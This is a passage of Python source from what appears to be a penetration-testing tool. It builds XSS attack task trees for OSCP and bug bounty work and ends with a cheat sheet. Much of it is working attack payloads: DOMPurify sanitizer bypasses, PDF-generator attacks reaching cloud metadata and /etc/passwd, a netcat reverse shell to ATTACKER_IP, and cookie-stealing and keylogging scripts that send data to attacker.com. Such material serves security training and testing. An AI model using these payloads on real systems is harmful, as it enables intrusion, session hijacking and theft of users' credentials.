                            '# Test for cid: protocol bypass:\n<a id=x href="cid:&quot;onerror=alert(1)//">test</a>\nDOMPurify allows cid: → &quot; decoded at runtime → onerror created',
                            "# Form attribute clobbering:\n<form id=x><input id=attributes></form>\nBypass: Sanitizer can\'t read .attributes property (clobbered)"
                        ],
                        'success_indicators': [
                            'Old DOMPurify version detected',
                            'Known CVE payload works',
                            'Alert fires post-sanitization',
                            'mXSS bypass confirmed'
                        ],
                        'failure_indicators': [
                            'Latest DOMPurify version (patched)',
                            'All payloads sanitized',
                            'No DOM mutation occurs',
                            'Strict CSP prevents execution'
                        ],
                        'next_steps': [
                            'Check DOMPurify CVE list: https://github.com/cure53/DOMPurify/security',
                            'Test version-specific bypasses',
                            'Monitor for new 0-days',
                            'Report if new bypass found ($$$ bug bounty)'
                        ],
                        'notes': 'DOMPurify most popular HTML sanitizer. mXSS history: CVE-2019-20374 (namespace), CVE-2020-26870 (form mutation). Check version first. Old versions: High chance of bypass. New: Rare but possible. OSCP: Not relevant. Bug bounty: CRITICAL severity (affects major sites).'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 11: UNIVERSAL XSS VECTORS
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-universal-vectors-{port}',
            'name': 'Universal XSS Vectors',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-pdf-generation-{port}',
                    'name': 'Server-Side XSS via PDF Generation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PDF generation libraries to achieve server-side XSS/RCE',
                        'tags': ['OSCP:MEDIUM', 'RCE', 'SSRF'],
                        'alternatives': [
                            '# Vulnerable pattern:\nApp generates PDF from user HTML (wkhtmltopdf, headless Chrome)',
                            '# XSS in PDF (client-side execution when PDF opened):\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>',
                            '# SSRF via PDF:\n<iframe src="http://127.0.0.1:8080/admin"></iframe>\n<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
                            '# LFI via PDF:\n<iframe src="file:///etc/passwd"></iframe>\n<img src="file:///c:/windows/win.ini">',
                            "# RCE via PDF (if Node.js PDF libs):\n<script>require('child_process').exec(\"nc ATTACKER_IP 4444 -e /bin/sh\")</script>",
                            '# Test endpoint:\nPOST /api/generate-pdf\n{"html": "<script>alert(1)</script>"}'
                        ],
                        'success_indicators': [
                            'PDF generated with injected payload',
                            'Alert fires when PDF opened',
                            'SSRF successful (internal resources accessed)',
                            'LFI successful (file contents in PDF)',
                            'RCE successful (reverse shell)'
                        ],
                        'failure_indicators': [
                            'HTML sanitized before PDF generation',
                            'Sandboxed PDF generator',
                            'file:// protocol blocked',
                            'No JavaScript execution in PDF'
                        ],
                        'next_steps': [
                            'Identify PDF generation endpoint',
                            'Test XSS: <script>alert(1)</script>',
                            'Test SSRF: <iframe src=http://127.0.0.1:22>',
                            'Test LFI: <iframe src=file:///etc/passwd>',
                            'If Node.js: Test RCE with require()'
                        ],
                        'notes': "PDF XSS: wkhtmltopdf, headless Chrome, puppeteer convert HTML→PDF. If user HTML not sanitized: XSS (client), SSRF (server), LFI (server). High impact: RCE possible via Node require('child_process'). OSCP: Check PDF export features. Test: <iframe src=file:///etc/passwd></iframe>"
                    }
                }
            ]
        })

        # ===================================================================
        # DOCUMENTATION & OSCP REPORTING
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-documentation-{port}',
            'name': 'XSS Documentation & Reporting',
            'type': 'manual',
            'metadata': {
                'description': 'Document XSS findings for OSCP exam report',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'alternatives': [
                    '# Required OSCP documentation:\n1. Vulnerable parameter\n2. XSS context (HTML, attribute, JS)\n3. Payload used\n4. Screenshot of alert(document.domain)\n5. Impact assessment',
                    '# Screenshot requirements:\n- URL visible\n- alert(document.domain) popup\n- Parameter value visible',
                    '# Report template:\n## XSS Vulnerability\n**Parameter:** search\n**Context:** Raw HTML\n**Payload:** <script>alert(document.domain)</script>\n**Impact:** Session hijacking, defacement, phishing\n**Remediation:** Implement output encoding and CSP',
                    '# Proof of concept:\ncurl "{base_url}/?search=<script>alert(document.domain)</script>"\nScreenshot: xss-proof.png',
                    "# Advanced impact demo:\n- Session stealing: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>\n- Keylogging: <script>document.onkeypress=function(e){fetch(\"http://attacker.com/?key=\"+e.key)}</script>\n- Defacement: <script>document.body.innerHTML=\"HACKED\"</script>",
                ],
                'success_indicators': [
                    'XSS confirmed with alert(document.domain)',
                    'Screenshot captured',
                    'Impact demonstrated',
                    'Remediation provided'
                ],
                'notes': 'OSCP XSS requirements: 1) alert(document.domain) screenshot 2) Show parameter and payload 3) Explain context 4) Describe impact. Use document.domain (not alert(1)) to prove domain execution. Store POC commands in notes for report.'
            }
        })

        return tasks

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate on XSS detection"""
        from ..core.constants import FindingTypes
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match
        if finding_type == FindingTypes.XSS_FOUND:
            logger.info("XSS attacks activating: XSS vulnerability detected")
            return 100

        # High - XSS indicators
        if 'xss' in description or 'cross-site scripting' in description:
            logger.info("XSS attacks activating: XSS keyword detected")
            return 90

        # High - XSS context indicators
        xss_contexts = ['reflected', 'stored', 'dom-based', 'dom xss', 'innerHTML',
                       'javascript context', 'html injection']
        if any(ctx in description for ctx in xss_contexts):
            logger.info("XSS attacks activating: XSS context detected")
            return 85

        # Medium - Input reflection without sanitization
        if 'reflected' in description and 'parameter' in description:
            logger.info("XSS attacks activating: Reflected parameter detected")
            return 70

        return 0


# ===================================================================
# HELPER FUNCTIONS
# ===================================================================

def _create_xss_cheatsheet() -> str:
    """Generate XSS quick reference cheatsheet"""
    return """
XSS Quick Reference Cheatsheet
================================

CONTEXTS:
1. Raw HTML: <script>alert(1)</script> OR <img src=x onerror=alert(1)>
2. HTML Attribute: "><script>alert(1)</script> OR " onfocus=alert(1) x="
3. JavaScript String: ";alert(1);// OR \';alert(1);//
4. JavaScript Template: ${alert(1)}
5. Event Handler: alert(1) (already in JS context)

FILTER BYPASSES:
- Case: <ScRiPt>alert(1)</ScRiPt>
- Double: <scr<script>ipt>alert(1)</script>
- Encoding: \\u0061lert(1) (Unicode in JS)
- Protocol: javascript:alert(1) OR data:text/html,<script>alert(1)</script>

CSP BYPASS:
- Check: curl -I URL | grep -i csp
- unsafe-inline: Normal XSS works
- JSONP: <script src="https://whitelisted.com/api?callback=alert"></script>

POLYGLOT: \\"><img src=x onerror=alert(1)>

DOM XSS:
- Sources: location.search, location.hash, document.cookie
- Sinks: eval(), innerHTML, document.write()
- Flow: Source → Processing → Sink

CLIENT-SIDE TEMPLATE:
- Angular: {{constructor.constructor("alert(1)')()}}
- Vue: {{this.constructor.constructor('alert(1)')()}}
- React: dangerouslySetInnerHTML={{__html: payload}}

TOOLS:
- xsstrike -u URL --crawl
- dalfox url URL
- Burp Collaborator (blind XSS)
"""

